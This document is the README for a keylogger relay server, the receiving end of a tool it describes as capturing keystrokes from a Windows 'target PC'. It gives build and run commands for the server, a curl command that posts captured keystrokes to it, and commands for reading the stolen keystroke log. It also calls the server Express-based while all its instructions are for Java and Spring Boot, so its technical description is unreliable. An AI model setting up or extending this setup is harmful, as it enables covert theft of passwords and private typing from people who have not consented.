# Aetriks Relay Server

The Aetriks Relay Server is a lightweight Express-based server designed to receive and log keystroke data from the Aetriks Keylogger running on a Windows target PC.

---

## Features

- POST /api/keystrokes for logging key data

- GET / for viewing formatted keystroke logs

## Prerequisites
- Java 17 or higher (java -version)

- Maven, or use the provided Maven Wrapper (./mvnw)

### Installation & Running

- Clone the repository

``` bash
git clone <repo-url>  
cd aetriks-relay-java  
```

- Build and run
``` bash
mvn clean install  
mvn spring-boot:run  
```
- Or using the Maven Wrapper:
```bash
./mvnw clean install  
./mvnw spring-boot:run  
```
- Run the packaged application
```bash
java -jar target/aetriks-relay-java-0.0.1-SNAPSHOT.jar  
```
- Override default port (e.g. 9090):
```bash
java -jar target/*.jar --server.port=9090  
```

- Usage
Log keystrokes

```bash
curl -X POST http://hostip:8080/api/keystrokes \
  -H "Content-Type: application/json" \
  -d '{"keyboardData":"your keystrokes here"}'
```

- View logs
Open in browser or use:

```bash
curl http://hostip:8080/
```
- Monitor keystroke file
```bash
tail -f keyboard_capture.txt
```
---
